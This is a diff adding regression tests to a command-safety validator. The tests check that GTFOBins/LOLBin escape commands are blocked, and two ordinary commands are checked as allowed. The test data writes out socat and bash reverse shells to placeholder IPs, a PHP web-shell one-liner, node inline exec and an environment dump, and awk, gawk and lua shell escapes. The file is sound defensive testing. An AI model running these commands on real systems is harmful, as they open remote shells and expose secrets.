@@ -342,4 +342,35 @@ describe('safety — policy and classifier', () => {
     });
   });
 
+  // ─── Research regression: GTFOBins / LOLBin escapes ───────────────────────
+  // Borrowed from the GTFOBins corpus + MITRE ATT&CK T1059. These hide an
+  // arbitrary command inside a "harmless" tool or open a network shell, and
+  // previously slipped through to MEDIUM unless the inner payload happened to
+  // be blocklisted on its own.
+  describe('research regression — GTFOBins/LOLBin escapes blocked', () => {
+    it.each([
+      'socat tcp-connect:10.0.0.1:4444 exec:/bin/sh',  // reverse shell
+      'socat - tcp:1.2.3.4:80',
+      'bash -i >& /dev/udp/10.0.0.1/4444 0>&1',         // udp reverse shell
+      "node -e \"require('child_process').exec('id')\"", // node inline eval
+      'node -p process.env',
+      'php -r "system($_GET[0]);"',
+      "awk 'BEGIN{system(\"/bin/sh\")}'",               // awk exec escape
+      "gawk 'BEGIN{system(\"id\")}'",
+      "lua -e 'os.execute(\"id\")'",
+    ])('blocks "%s"', (cmd) => {
+      const result = validateCommandAgainstPolicy(cmd);
+      expect(result.allowed).toBe(false);
+      expect(result.riskLevel).toBe(RiskLevel.HIGH_RISK_BLOCKED);
+      expect(result.matchedRule).toBeTruthy();
+    });
+
+    it.each([
+      "awk '{print $1}' /var/log/nginx/access.log",  // legit text processing
+      'node server.js',                              // legit app start
+    ])('does not block legit "%s"', (cmd) => {
+      expect(validateCommandAgainstPolicy(cmd).riskLevel).not.toBe(RiskLevel.HIGH_RISK_BLOCKED);
+    });
+  });
+
 });
